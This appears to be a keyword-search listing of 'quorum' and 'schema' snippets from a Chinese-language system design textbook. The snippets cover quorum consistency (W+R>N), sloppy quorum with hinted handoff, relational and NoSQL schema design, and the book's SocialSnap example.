  c14_b08.md: ...tradeoff（权衡）编码在 Cassandra 的 `LOCAL_QUORUM` 一致性级别中：在本地区域内达到 quorum（快速，区域内协调），而不要求其他区域确认。其他区域的读可能看到陈旧数据，但本地区域的读是强一致性（strong con...
  c14_b08.md: ...“规模化的冲突解决”问题  如果欧洲用户和美国用户同时更新同一条记录呢？欧洲节点和美国节点都接受各自的写（各自达到本地 quorum）。当节点互相复制时，发现同一条记录有不同值。  这就是**写冲突（write conflict）**。解决选项：  *...
  c14_b09.md: ...最终一致性 | 低延迟；高可用；分区期间继续服务 | 陈旧读；冲突解决复杂 | 社交数据；点赞数；缓存数据；非关键读 Quorum 读/写 | 一致性与性能之间可调 tradeoff（权衡） | 配置复杂；需要理解 N、R、W | 不同操作需要不同一...
  c14_b10.md: ...10,247。这种不一致只持续毫秒到秒，没有业务后果——短暂看到略旧的计数不会伤害任何用户。  **Q2.** 解释 quorum 条件 `W + R > N`。为什么满足该条件就能保证读返回最近写入的值？  **答案：** N 个副本中，W 是必须...
  c14_b10.md: ...最小重叠节点数为 `W + R - N`。）  这保证强一致性，因为重叠节点参与了最近写，因此拥有最新值。当 R 个读 quorum 响应时，读者可取版本号最高的响应——它来自重叠节点。因此读总是返回最近写。  如果 `W + R <= N`，就可能写...
  c14_b12.md: ...类场景中的后果，以及操作的延迟敏感度。  **答案：** (a) 读取用户自己的资料以便编辑：推荐 R=3（N=5 时 QUORUM，因为 floor(5/2)+1 = 3）。用户正要编辑资料——如果他们读到陈旧版本（可能漏掉他们在另一台设备上最近做的...
  c14_b12.md: ...在另一台设备上最近做的修改），保存时可能覆盖更新版本。编辑表单应显示当前状态。编辑资料是不频繁操作，用户正等待页面加载，quorum 读的适度延迟可接受。  写编辑后的资料时，用 W=3（QUORUM）。结合 R=3，W+R=6 > N=5，保证强一致...
  c14_b14.md: ...使没有完整分区，**延迟可变性**也会造成同样困境。如果某个节点很慢（没宕，只是慢——网络拥塞、GC 暂停、磁盘饱和），quorum 读必须等待慢节点或按少于请求的响应数返回。系统必须在等待（牺牲可用性）和继续而不等慢节点（可能牺牲一致性）之间选择。这...
  c14_b15.md: ...P 定理形式化了这个 tradeoff（权衡）：网络分区期间，分布式系统必须选择一致性还是可用性。现代分布式数据库通过 quorum 读/写让这种选择可调——`W+R>N` 条件保证强一致读，而无需所有节点参与。  冲突解决策略范围从最后写入获胜（简单...
  c16_b04.md: ...作，主主需要仔细协调以避免第 14 章的冲突场景。这就是为什么多主数据库（多节点接受写）需要第 14 章的一致性机制——quorum 写、冲突解决、CRDT。   ### 16.4 熔断器模式  现在我们回到 SocialSnap 的周二的 outag...
  c16_b18.md: ...一致性）。分区恢复后，低 epoch 数据中心回放赢家的写。这是第 14 章 CAP 定理的 CP 方案。  **基于 quorum 的写：** 写要求跨两个数据中心获得节点 quorum 确认（例如 5 个节点中的 3 个）。分区期间，如果数据中心无...
  c16_b18.md: ...写。这是第 14 章 CAP 定理的 CP 方案。  **基于 quorum 的写：** 写要求跨两个数据中心获得节点 quorum 确认（例如 5 个节点中的 3 个）。分区期间，如果数据中心无法联系到足够节点组成 quorum，它拒绝写。这防止脑裂...
  c16_b18.md: ...两个数据中心获得节点 quorum 确认（例如 5 个节点中的 3 个）。分区期间，如果数据中心无法联系到足够节点组成 quorum，它拒绝写。这防止脑裂，代价是分区期间写不可用。  **应用层最后写入获胜 + 客户端冲突检测：** 使用向量时钟（第...
  c26_b03.md: ...value)` 时，写发送到协调节点，协调节点再复制给顺时针下 2 个节点。最终 3 个节点都应有该值。   #### Quorum 系统——N、W、R  有 N 副本时，写成功前必须有多少副本确认？读又有多少副本响应才可信？  可配置的 quorum...
  c26_b03.md: ...Quorum 系统——N、W、R  有 N 副本时，写成功前必须有多少副本确认？读又有多少副本响应才可信？  可配置的 quorum 使这成为可调权衡：  * **N：** 每个键的副本总数 * **W：** 写 quorum——必须确认写的最少副本数...
  c26_b03.md: ...响应才可信？  可配置的 quorum 使这成为可调权衡：  * **N：** 每个键的副本总数 * **W：** 写 quorum——必须确认写的最少副本数（N 中 W 个节点确认） * **R：** 读 quorum——必须响应读的最少副本数（N...
  c26_b03.md: ...副本总数 * **W：** 写 quorum——必须确认写的最少副本数（N 中 W 个节点确认） * **R：** 读 quorum——必须响应读的最少副本数（N 中 R 个节点回复）   #### 定义：Quorum（N, W, R）  参数为 N、...
  c26_b03.md: ...节点确认） * **R：** 读 quorum——必须响应读的最少副本数（N 中 R 个节点回复）   #### 定义：Quorum（N, W, R）  参数为 N、W、R 的 quorum 系统在 `W + R > N` 时提供 **强一致性**。这...
  c26_b03.md: ...读的最少副本数（N 中 R 个节点回复）   #### 定义：Quorum（N, W, R）  参数为 N、W、R 的 quorum 系统在 `W + R > N` 时提供 **强一致性**。这确保读 quorum 和写 quorum 至少共享一个节点...
  c26_b03.md: ...W, R）  参数为 N、W、R 的 quorum 系统在 `W + R > N` 时提供 **强一致性**。这确保读 quorum 和写 quorum 至少共享一个节点——一个既参与最新写又包含在读中的节点。任何读都至少会找到一个具有最新值的节点。...
  c26_b03.md: ...N、W、R 的 quorum 系统在 `W + R > N` 时提供 **强一致性**。这确保读 quorum 和写 quorum 至少共享一个节点——一个既参与最新写又包含在读中的节点。任何读都至少会找到一个具有最新值的节点。  当 `W + R...
  c26_b03.md: ...又包含在读中的节点。任何读都至少会找到一个具有最新值的节点。  当 `W + R ≤ N` 时，读可能返回陈旧值——读 quorum 可能与写 quorum 不重叠。这是 **最终一致性（eventual consistency）**：所有副本最终会达...
  c26_b03.md: ...读都至少会找到一个具有最新值的节点。  当 `W + R ≤ N` 时，读可能返回陈旧值——读 quorum 可能与写 quorum 不重叠。这是 **最终一致性（eventual consistency）**：所有副本最终会达成一致，但在任意瞬间，某...
  c26_b03.md: ...的教训）而非键值存储。  * * *   ### 26.3 处理故障——Hinted Handoff 与 Sloppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用的节点时怎么办？  严格 quorum 行为：若...
  c26_b03.md: ...oppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用的节点时怎么办？  严格 quorum 行为：若无法达到 W 个节点，写失败。这保证一致性但牺牲可用性——任何节点故障都会导致对应键的写失败。  Dynamo...
  c26_b03.md: ...致对应键的写失败。  Dynamo 方法（来自 Amazon 2007 年著名论文，本章设计基于它）：**sloppy quorum** 加 **hinted handoff**。...
  c26_b03.md: ...value)` 时，写发送到协调节点，协调节点再复制给顺时针下 2 个节点。最终 3 个节点都应有该值。   #### Quorum 系统——N、W、R  有 N 副本时，写成功前必须有多少副本确认？读又有多少副本响应才可信？  可配置的 quorum...
  c26_b03.md: ...Quorum 系统——N、W、R  有 N 副本时，写成功前必须有多少副本确认？读又有多少副本响应才可信？  可配置的 quorum 使这成为可调权衡：  * **N：** 每个键的副本总数 * **W：** 写 quorum——必须确认写的最少副本数...
  c26_b03.md: ...响应才可信？  可配置的 quorum 使这成为可调权衡：  * **N：** 每个键的副本总数 * **W：** 写 quorum——必须确认写的最少副本数（N 中 W 个节点确认） * **R：** 读 quorum——必须响应读的最少副本数（N...
  c26_b03.md: ...副本总数 * **W：** 写 quorum——必须确认写的最少副本数（N 中 W 个节点确认） * **R：** 读 quorum——必须响应读的最少副本数（N 中 R 个节点回复）   #### 定义：Quorum（N, W, R）  参数为 N、...
  c26_b03.md: ...节点确认） * **R：** 读 quorum——必须响应读的最少副本数（N 中 R 个节点回复）   #### 定义：Quorum（N, W, R）  参数为 N、W、R 的 quorum 系统在 `W + R > N` 时提供 **强一致性**。这...
  c26_b03.md: ...读的最少副本数（N 中 R 个节点回复）   #### 定义：Quorum（N, W, R）  参数为 N、W、R 的 quorum 系统在 `W + R > N` 时提供 **强一致性**。这确保读 quorum 和写 quorum 至少共享一个节点...
  c26_b03.md: ...W, R）  参数为 N、W、R 的 quorum 系统在 `W + R > N` 时提供 **强一致性**。这确保读 quorum 和写 quorum 至少共享一个节点——一个既参与最新写又包含在读中的节点。任何读都至少会找到一个具有最新值的节点。...
  c26_b03.md: ...N、W、R 的 quorum 系统在 `W + R > N` 时提供 **强一致性**。这确保读 quorum 和写 quorum 至少共享一个节点——一个既参与最新写又包含在读中的节点。任何读都至少会找到一个具有最新值的节点。  当 `W + R...
  c26_b03.md: ...又包含在读中的节点。任何读都至少会找到一个具有最新值的节点。  当 `W + R ≤ N` 时，读可能返回陈旧值——读 quorum 可能与写 quorum 不重叠。这是 **最终一致性（eventual consistency）**：所有副本最终会达...
  c26_b03.md: ...读都至少会找到一个具有最新值的节点。  当 `W + R ≤ N` 时，读可能返回陈旧值——读 quorum 可能与写 quorum 不重叠。这是 **最终一致性（eventual consistency）**：所有副本最终会达成一致，但在任意瞬间，某...
  c26_b03.md: ...的教训）而非键值存储。  * * *   ### 26.3 处理故障——Hinted Handoff 与 Sloppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用的节点时怎么办？  严格 quorum 行为：若...
  c26_b03.md: ...oppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用的节点时怎么办？  严格 quorum 行为：若无法达到 W 个节点，写失败。这保证一致性但牺牲可用性——任何节点故障都会导致对应键的写失败。  Dynamo...
  c26_b03.md: ...致对应键的写失败。  Dynamo 方法（来自 Amazon 2007 年著名论文，本章设计基于它）：**sloppy quorum** 加 **hinted handoff**。...
  c26_b04.md: ...#### 定义：Sloppy Quorum  **Sloppy quorum** 允许写继续到环上任意 W 个可用节点，而不一定是标准 preference li...
  c26_b04.md: ...#### 定义：Sloppy Quorum  **Sloppy quorum** 允许写继续到环上任意 W 个可用节点，而不一定是标准 preference list 中的 W 个节点。若标准节点...
  c26_b04.md: ...。A 回来时，邻居交还数据。这使系统保持高可用——写总是成功到 W 个节点——代价是偶尔的临时不一致。  Sloppy quorum 显著提升可用性。没有它，任一节点故障都会导致其拥有的键写失败。有了它，只要任意 W 个节点可达，写可用性就近乎 100...
  c26_b04.md: ...#### 定义：Sloppy Quorum  **Sloppy quorum** 允许写继续到环上任意 W 个可用节点，而不一定是标准 preference li...
  c26_b04.md: ...#### 定义：Sloppy Quorum  **Sloppy quorum** 允许写继续到环上任意 W 个可用节点，而不一定是标准 preference list 中的 W 个节点。若标准节点...
  c26_b04.md: ...。A 回来时，邻居交还数据。这使系统保持高可用——写总是成功到 W 个节点——代价是偶尔的临时不一致。  Sloppy quorum 显著提升可用性。没有它，任一节点故障都会导致其拥有的键写失败。有了它，只要任意 W 个节点可达，写可用性就近乎 100...
  c26_b06.md: ...（第 21 章建立）依赖多个键值存储，却从未检视其内部。现在我们看到全貌。  **SocialSnap 的键值存储及其 quorum 配置：**  **会话存储**（SocialSnap v4，第 11 章）：存储用户会话 token。N=3，W=2，...
  c26_b06.md: ...要 read-your-writes 一致性（你登录后，下个请求必须找到会话）。W + R = 4 > N = 3，读 quorum 保证与写 quorum 重叠，确保每次读都看到最新写。会话 token 若连 1 个请求都未持久化就是登录失败。  *...
  c26_b06.md: ...writes 一致性（你登录后，下个请求必须找到会话）。W + R = 4 > N = 3，读 quorum 保证与写 quorum 重叠，确保每次读都看到最新写。会话 token 若连 1 个请求都未持久化就是登录失败。  **Timeline 缓存...
  c26_b06.md: ...d 中轻微陈旧可接受。写速度至关重要（写时扇出必须对 5000 万（50 million）用户快速完成）。Sloppy quorum 加 hinted handoff 保证节点故障期间的高写可用性——timeline 即使在部分故障时也必须可写。  *...
  c26_b07.md: ...章大部分概念。其关键创新：  1. **带虚拟节点的一致性哈希：** 解决数据分布与再平衡问题 2. **Sloppy quorum 与 hinted handoff：** 解决节点故障期间的写可用性问题 3. **Merkle tree anti-e...
  c26_b08.md: ...尚未转发，读可能去 A（刚恢复但尚未更新）得到陈旧值，或去 B（作为 hint 持有最新值）得到正确值。结果取决于 R-quorum 联系哪些节点。不一致窗口从 A 恢复持续到 hinted handoff 完成——通常数秒到数分钟。  **Q4.**...
  c26_b10.md: ...new_value)`。写协调器是节点 A，preference list 是 [A, B, C]。追踪 sloppy quorum 加 hinted handoff 下该写的去向。然后追踪后续读 `GET("user:101:timeline")`...
  c26_b10.md: ...01:timeline")` 在 R=1 下的去向。读有哪些可能结果，什么决定哪种结果？  提示  记住 sloppy quorum 允许写到任意 W 个可用节点。从 A 的视角看哪些节点可达。然后想 R=1 的读可能联系哪个节点。  **答案：**...
  c26_b10.md: ...A（协调器）尝试写入 preference list [A, B, C]。节点 C 被隔离——不可达。在 sloppy quorum 下，A 用可用节点继续。W=1，所以只写到 A 就满足写 quorum。A 也复制给 B（都在 preference...
  c26_b10.md: ...。节点 C 被隔离——不可达。在 sloppy quorum 下，A 用可用节点继续。W=1，所以只写到 A 就满足写 quorum。A 也复制给 B（都在 preference list 且可达）。C 不可达；A（或 B）存储 hint：“节点 C...
  c26_b13.md: ...讨论：** 这是本章综合的回顾练习。Foundations（第 1–4 章）：CAP 定理（第 4 章）是 N/W/R quorum 选择的直接理论基础。选 N=3、W=1、R=1 就是选择牺牲一致性换取可用性和分区容错性（partition tole...
  c26_b13.md: ...。选 N=3、W=1、R=1 就是选择牺牲一致性换取可用性和分区容错性（partition tolerance）。整个 quorum 讨论都是把 CAP 权衡具体化、可调化。Building Blocks（第 5–10 章）：一致性哈希（第 9 章负载...
  c26_b13.md: ...Hinted handoff 是可靠性机制——类似第 16 章优雅降级模式。节点故障时系统优雅降级：通过 sloppy quorum 写仍成功，并通过 anti-entropy 最终恢复正确性。Case Studies：第 25 章的位置存储展示了高写...
  c26_b13.md: ...解决数据分布：通过环把键分配给节点，节点增删只移动约 1/N 的键。虚拟节点平滑物理节点间的分布。  **N/W/R quorum 系统** 使一致性成为可调参数，而非二元选择。W + R > N 给出强一致性；W + R ≤ N 给出最终一致性。S...
  c26_b13.md: ...一致性。SocialSnap 对不同数据类型使用不同 N/W/R 配置，反映它们不同的一致性需求。  **Sloppy quorum 加 hinted handoff** 优先写可用性：写总是成功到 W 个可用节点，hinted 数据在标准节点恢复后转...
  c28_b14.md: ...shing** (Ch 25) | 极低（前缀键查找） | 最终（空间索引异步更新） | 高 | 低 **Sloppy quorum + hinted handoff** (Ch 26) | 低（写到任意 W 节点） | 最终（标准节点可能未最新） |...
  c28_b14.md: ...ual nodes** (Ch 26) | 无延迟成本 | N/A | 极高（变更时最小扰动） | 中 **N/W/R quorum (distributed KV)** (Ch 26) | 可调（W=1, R=1 最快） | 可调（W + R > N...

=== schema (112 occurrences) ===
  c05_b01.md: ...义：关系模型  **关系模型** 把数据组织成**关系（relation）**（即表），其中：  * 每张表有一个 **schema**（定义好的列集合及类型） * 每一行都满足该 schema * 表之间的关系通过 **外键** 表达（一张表中的列引...
  c05_b01.md: ...ation）**（即表），其中：  * 每张表有一个 **schema**（定义好的列集合及类型） * 每一行都满足该 schema * 表之间的关系通过 **外键** 表达（一张表中的列引用另一张表的主键） * 数据使用 **SQL**（Struct...
  c05_b02.md: ...环。你没有遍历树。你声明你想要什么，数据库自己想办法取回。这就是关系型数据库的魔力——**声明式查询**运行在**灵活 schema** 之上。  在理解它为什么快（索引）以及为什么最终崩溃（规模）之前，我们先看看 SQL 是如何执行的。   ###...
  c05_b06.md: ...machine)   仍然是一台机器，但现在数据在重启后持久化，并且可以灵活查询。  **SocialSnap v1 schema：**      CREATE TABLE users (         id          SERIAL PRI...
  c05_b06.md: ...idx_follows_followed_id ON follows(followed_id);  **为什么这样设计 schema：**  `users` 表上的 `follower_count` 和 `following_count` 是**反规范...
  c05_b10.md: ...提及”功能：一篇帖子可以通过用户名提及最多 10 个其他用户（如“@alice 和 @bob”）。设计支持此功能所需的 schema 扩展，包括合适的索引。然后写一条 SQL 查询“给我看所有提及 Alice 的帖子，按最近排序”。  提示  把提及存...
  c05_b10.md: ...反关系模型，也让查询很难。想想提及是什么实体，以及它如何与 posts 和 users 关联。  **答案：**  **Schema 扩展：**      CREATE TABLE mentions (         post_id     INTE...
  c05_b10.md: ...提及”功能：一篇帖子可以通过用户名提及最多 10 个其他用户（如“@alice 和 @bob”）。设计支持此功能所需的 schema 扩展，包括合适的索引。然后写一条 SQL 查询“给我看所有提及 Alice 的帖子，按最近排序”。  提示  把提及存...
  c05_b10.md: ...反关系模型，也让查询很难。想想提及是什么实体，以及它如何与 posts 和 users 关联。  **答案：**  **Schema 扩展：**      CREATE TABLE mentions (         post_id     INTE...
  c05_b11.md: ...数器（更适合点赞数这种场景）**  在 `posts` 表里加一个 `like_count` 列（我们在 5.4 节的 schema 中已经勾勒过）。每次点赞时在事务内原子递增：      BEGIN;     INSERT INTO likes (u...
  c05_b11.md: ...*用户资料**（姓名、简介、头像 URL、加入日期）和**帖子**（文本内容、图片 URL、时间戳、作者）。设计关系型 schema：定义表、列、主键，以及它们之间的外键关系。然后解释哪个查询——“获取用户 X 的所有帖子，按最近在前排序”——需要索引...
  c05_b11.md: ...在没有索引的大表上满足 ORDER BY 子句时必须做什么——回顾 5.2 节全表扫描的讨论。  **答案：**  **Schema 设计：**      CREATE TABLE users (         id          SERIAL...
  c05_b11.md: ...数器（更适合点赞数这种场景）**  在 `posts` 表里加一个 `like_count` 列（我们在 5.4 节的 schema 中已经勾勒过）。每次点赞时在事务内原子递增：      BEGIN;     INSERT INTO likes (u...
  c05_b11.md: ...*用户资料**（姓名、简介、头像 URL、加入日期）和**帖子**（文本内容、图片 URL、时间戳、作者）。设计关系型 schema：定义表、列、主键，以及它们之间的外键关系。然后解释哪个查询——“获取用户 X 的所有帖子，按最近在前排序”——需要索引...
  c05_b11.md: ...在没有索引的大表上满足 ORDER BY 子句时必须做什么——回顾 5.2 节全表扫描的讨论。  **答案：**  **Schema 设计：**      CREATE TABLE users (         id          SERIAL...
  c05_b13.md: ...#### 深入思考  **Q1.** SocialSnap v1 schema 把 `follower_count` 和 `following_count` 直接存在 `users` 表上，而不是在...
  c05_b13.md: ...少冗余数据） * 计算昂贵（SQL 的声明式模型比手写遍历更高效） * 主导工作负载是事务处理（银行、库存、工资） * schema 灵活性次于正确性  Web 时代改变了情境：...
  c05_b14.md: ...变得极端（10 亿用户 × 1 万亿操作压垮单节点 SQL） * 工作负载变成读密集型（社交 Feed、内容分发） * schema 灵活性变得有价值（用户生成内容的形状不可预测）  NoSQL 数据库并不比关系型数据库“更好”——它们为不同情境优化。...
  c05_b14.md: ...心的具体访问模式，以及每种 NoSQL 家族如何应对它们。   ### 本章总结  **关系模型**把数据组织成有定义 schema 的表，通过外键连接。它的力量来自 **SQL**——一种声明式查询语言，让你问关于数据的任何问题，而无需把查询与存储实...
  c05_b14.md: ...确性。  我们介绍了 **SocialSnap v1**：一个由 PostgreSQL 数据库支持的 Flask 应用，schema 包含 users、posts、follows 和 likes。这是一个完整、正确的基础，能在触及限制前处理数万到数十万...
  c06_b01.md: ...材料。每种产品类型都有自己的属性集合——而且每月都会增加新产品类型。团队把一半工程时间花在写数据库迁移、添加新列和修改 schema 上。  这个问题的正确数据库是什么？  再考虑另一个案例：一个社交网络存储 200 百万（2 亿）用户，需要在 10...
  c06_b01.md: ...——而是工具与工作负载不匹配。关系型数据库擅长结构化数据、复杂多表查询和强一致性；它们在不 predictable 的 schema、极端写吞吐和图遍历面前挣扎。  NoSQL 数据库正是为这些不匹配而存在。“NoSQL”不是单一事物——它是一个由四种...
  c06_b01.md: ...|---|---|---|---| | 文档存储（Document Store） | 类似 JSON 的文档 | 灵活 schema，嵌套数据 | MongoDB, CouchDB, Firestore | | 键值存储（Key-Value Store...
  c06_b02.md: ...### 6.2 文档存储——灵活 Schema，嵌套数据  文档存储解决产品目录问题。它不再把每个产品硬塞进僵硬的表 schema，而是把每个产品存为一个**文档（d...
  c06_b02.md: ...### 6.2 文档存储——灵活 Schema，嵌套数据  文档存储解决产品目录问题。它不再把每个产品硬塞进僵硬的表 schema，而是把每个产品存为一个**文档（document）**——一个类似 JSON 的对象，包含该特定产品所需的任意字段。...
  c06_b02.md: ...}     }   两个文档共存于同一个集合（collection）。当另一个文档增加新属性类型时，两者都不需要 schema 迁移。应用读取 `attributes` 子文档并处理其中存在的任何字段。   #### 文档存储何时胜出  **灵活...
  c06_b02.md: ...用读取 `attributes` 子文档并处理其中存在的任何字段。   #### 文档存储何时胜出  **灵活或演进的 schema：** 内容管理系统、具有不同可选字段的用户资料、异构产品类型的产品目录。  **作为单元读取的层次数据：** 如果一篇...
  c06_b02.md: ...档可以嵌入一组社交链接数组，避免单独的表和 JOIN。   #### 文档存储的 Tradeoffs  **收益：** schema 灵活性、层次数据的自然表达、通常单文档读取很快。  **代价（一致性）：** 大多数文档存储提供比关系型数据库更弱的一...
  c06_b02.md: ...### 6.2 文档存储——灵活 Schema，嵌套数据  文档存储解决产品目录问题。它不再把每个产品硬塞进僵硬的表 schema，而是把每个产品存为一个**文档（d...
  c06_b02.md: ...### 6.2 文档存储——灵活 Schema，嵌套数据  文档存储解决产品目录问题。它不再把每个产品硬塞进僵硬的表 schema，而是把每个产品存为一个**文档（document）**——一个类似 JSON 的对象，包含该特定产品所需的任意字段。...
  c06_b02.md: ...}     }   两个文档共存于同一个集合（collection）。当另一个文档增加新属性类型时，两者都不需要 schema 迁移。应用读取 `attributes` 子文档并处理其中存在的任何字段。   #### 文档存储何时胜出  **灵活...
  c06_b02.md: ...用读取 `attributes` 子文档并处理其中存在的任何字段。   #### 文档存储何时胜出  **灵活或演进的 schema：** 内容管理系统、具有不同可选字段的用户资料、异构产品类型的产品目录。  **作为单元读取的层次数据：** 如果一篇...
  c06_b02.md: ...档可以嵌入一组社交链接数组，避免单独的表和 JOIN。   #### 文档存储的 Tradeoffs  **收益：** schema 灵活性、层次数据的自然表达、通常单文档读取很快。  **代价（一致性）：** 大多数文档存储提供比关系型数据库更弱的一...
  c06_b03.md: ...nt → 14323   这就是 Redis。操作是亚毫秒级，因为 Redis 把整个数据集放在内存中。没有索引、没有 schema、没有 join。只有 key 和 value。   #### 键值存储何时胜出  **缓存：** 第一大用例。用 TT...
  c06_b03.md: ...“谁现在在线”）。   #### 键值存储的 Tradeoffs（权衡）  **收益：** 微秒级读写。极致简单——无 schema、无迁移、无查询计划。可水平扩展（scalability，可扩展性）。  **代价（查询）：** 只能按精确 key 查...
  c06_b04.md: ...相当于跨分区 join）很贵，通常不推荐。在 Cassandra 中数据建模需要预先知道你的查询——你围绕访问模式设计 schema，而不是围绕数据关系。  **代价（一致性）：** Cassandra 的默认一致性模型是最终一致性。如果需要更强一致性...
  c06_b06.md: ...型数据库 * “跨多跳遍历关系” → 图数据库 * “写入时间序数据、按时间范围查询” → 列族存储  **第 2 步：schema 稳定性如何？**  * 稳定、定义清晰的 schema → 关系型数据库 * 演进 schema、异构数据 → 文档存...
  c06_b06.md: ...入时间序数据、按时间范围查询” → 列族存储  **第 2 步：schema 稳定性如何？**  * 稳定、定义清晰的 schema → 关系型数据库 * 演进 schema、异构数据 → 文档存储  **第 3 步：一致性要求是什么？**  * 需要...
  c06_b06.md: ...储  **第 2 步：schema 稳定性如何？**  * 稳定、定义清晰的 schema → 关系型数据库 * 演进 schema、异构数据 → 文档存储  **第 3 步：一致性要求是什么？**  * 需要强一致性（金融数据、认证） → 关系型数据...
  c06_b07.md: ...↓ 单文档读快 | ↑ 良好 | ↓ 比 ACID 弱（多文档事务昂贵） | ↑ 高 | ↑ 持久化到磁盘 | ↑ 无 schema 迁移，但有数据冗余风险 | | **键值存储（如 Redis）** | ↓↓ 亚毫秒（内存） | ↑↑ 极高 | ↓↓...
  c06_b07.md: ...致（可调） | ↑↑ 很高；对等，无单主 | ↑ LSM-tree 持久化 | ↑↑ 查询模型要求围绕访问模式预先设计 schema | | **图数据库（如 Neo4j）** | ↓ 遍历快（基于指针） | ↔ 中等 | ↑ 通常 ACID | ↓...
  c06_b08.md: ...：** **文档存储**（如 MongoDB 或 Firestore）是合适选择。指向它的关键特征：  1. **异构 schema：** 每条备注形状不同——附件备注有 `file_url` 和 `file_type` 字段，通话录音备注有 `dur...
  c06_b08.md: ...，你要么需要一张有很多可空列的表（丑陋、难扩展），要么需要复杂的 EAV（entity-attribute-value）schema（更难查询）。文档存储把每条备注存为 JSON 文档，只包含它需要的字段。  2. **作为单元读取：** 客户的备注通...
  c06_b08.md: ...注通常一起展示。把每条备注存为文档意味着取回“客户 123 的所有备注”是单次查询，而不是跨表 JOIN。  3. **schema 演进：** 新的备注类型会随时间增加（视频通话、AI 工具的会议纪要）。给文档 schema 添加新字段是零停机非事件...
  c06_b08.md: ...JOIN。  3. **schema 演进：** 新的备注类型会随时间增加（视频通话、AI 工具的会议纪要）。给文档 schema 添加新字段是零停机非事件；给关系型数据库加列需要 schema 迁移。  需要注意的问题：如果 CRM 后来需要复杂的...
  c06_b08.md: ...会随时间增加（视频通话、AI 工具的会议纪要）。给文档 schema 添加新字段是零停机非事件；给关系型数据库加列需要 schema 迁移。  需要注意的问题：如果 CRM 后来需要复杂的跨客户分析（“找出过去 30 天有通话录音且交易在第 3 阶段的...
  c06_b10.md: ...”——这是对位置的范围查询，不是点查找 * 时间序列方面：位置历史可能对分析有用（路线重建、ETA）  **第 2 步：schema 稳定性：** 稳定——每次位置更新都有 driver_id、latitude、longitude、timestamp。...
  c06_b10.md: ...：** 稳定——每次位置更新都有 driver_id、latitude、longitude、timestamp。不需要 schema 演进。  **第 3 步：一致性要求：** 请求司机的乘客看到的位置可能是 5 秒前的（上次更新），这是可接受的——司...
  c06_b11.md: ...万）帖子表上运行时会发生什么。然后想想键值存储如何用有序集合增量维护计数。  **答案：**  **关系型方案：**  Schema（加入 SocialSnap v1）：       CREATE TABLE hashtags (         po...
  c06_b12.md: ...停止）。复杂查询：“找出所有正在服用药物 X 且肌酐升高的患者”——这需要跨记录聚合，是关系型查询。  **第 2 步：schema 稳定性。** 人口统计和药物部分是稳定的（固定字段）。临床笔记是异构的（可变部分）。实验室结果有定义好但可变的测试代码...
  c06_b13.md: ...维复杂度（双备份、两个连接池、系统间潜在一致性缺口）而无明显收益。PostgreSQL 的 JSONB 支持已覆盖灵活 schema 需求，无需单独系统。...
  c06_b14.md: ...超出关系型模型，不要从那里开始。  **2. 数据建模决策把你锁定。** 一个带复杂外键关系、触发器和存储过程的关系型 schema 很难迁移到 NoSQL。如果建模时假设永远要关系型 join，然后在规模下发现查询模式不匹配，“默认 PostgreS...
  c06_b14.md: ...* 文档存储（MongoDB 或类似）自然合适——每份资料有可变的可选属性集合（简介、网站、商业类别、关联账户）。灵活 schema 无需迁移即可处理。或者，带 JSONB 列的关系型数据库（PostgreSQL 的混合方案）给你 schema 灵活性...
  c06_b14.md: ...。灵活 schema 无需迁移即可处理。或者，带 JSONB 列的关系型数据库（PostgreSQL 的混合方案）给你 schema 灵活性和关系查询能力。...
  c06_b15.md: ...是对关系型数据库的否定——它是专业化。四种家族服务四种不同工作负载：  * **文档存储**（MongoDB）擅长灵活 schema 和层次嵌套数据。它们用查询灵活性换取 schema 自由。 * **键值存储**（Redis、DynamoDB）为基于...
  c06_b15.md: ...种不同工作负载：  * **文档存储**（MongoDB）擅长灵活 schema 和层次嵌套数据。它们用查询灵活性换取 schema 自由。 * **键值存储**（Redis、DynamoDB）为基于 key 的访问提供微秒级延迟。它们用查询能力换取速...
  c06_b15.md: ...一致对用户可见后果——金融数据需要 ACID，社交 Feed 可接受 BASE。  **决策框架**——先访问模式，再 schema 稳定性、一致性需求、规模和团队经验——给你一种结构化方式选择正确工具，而不是默认最熟悉的工具。  在第 7 章，我们转...
  c07_b01.md: ...SocialSnap v1 有了关系型数据库。用户可以创建账户、写帖子、互相关注。第 5 章的 schema 处理一切：`users`、`posts`、`follows`。日子很好过。  直到某篇 SocialSnap 帖子病毒...
  c08_b12.md: ...Bob 的帖子，Bob 在通知中心收到通知。这是高容量事件（每天数百万赞）。用消息队列为该功能设计消息流。包括：事件 schema、谁发布和谁消费、你会选择哪种投递保证、以及如何处理幂等性要求。  提示  想想通知服务需要哪些信息来构建 Bob 的通...
  c08_b12.md: ...后想故障情况：如果通知被投递两次，Bob 会看到两条“Alice 赞了你的帖子”通知吗？  **答案：**  **事件 schema：**       {       "event_type": "post.liked",       "event_i...
  c08_b13.md: ...A 的目的。  这是第 5 章反规范化讨论在缓存中的对应：你为了优化访问模式而结构化数据。缓存 key 设计就是缓存 schema 设计。粒度错了，命中率就受影响。  **Q3.**（联系第 6 章 CAP 定理讨论和第 8 章投递保证）Social...
  c09_b09.md: ...RPC 的优点：**  * 极快：二进制 Protobuf 序列化比 JSON 小 3-10 倍，解析更快 * 强类型：schema 定义每个字段和类型；类型不匹配在编译时捕获 * 自动生成客户端代码：无需手动构造 HTTP 客户端或解析 JSON *...
  c09_b09.md: ...（gRPC 需要 HTTP/2 特性，浏览器仅通过 gRPC-Web 部分支持） * Protocol Buffers schema 管理需要工具 * 对简单外部 API 杀鸡用牛刀  **何时选 gRPC：** 内部服务间通信，性能重要且两端都由你控...
  c09_b14.md: ...层（用 Redis，见第 7 章）。  服务器端复杂度：REST 端点是简单的数据库查询。GraphQL 服务器需要 schema 定义、每个字段的 resolver，以及防止深嵌套查询（查询深度限制、复杂度限制）的保护，避免产生巨大数据库负载。...
  c11_b01.md: ...1 章笔记本上的一个 Python 函数走了很远。它现在拥有：  * 设计良好的 PostgreSQL 关系型数据库 schema（第 5 章） * 用于资料查找和热数据的 Redis 缓存层（第 7 章） * 把欢迎邮件和通知从注册流程解耦的消息队...
  c12_b06.md: ...可能避免未来灾难性的迁移。   ### 12.6 反规范化——当 JOIN 变贵时  分片前，SocialSnap 的 schema 经过仔细规范化：用户数据在 `users` 表，帖子数据在 `posts` 表，好友数据在 `friendships`...
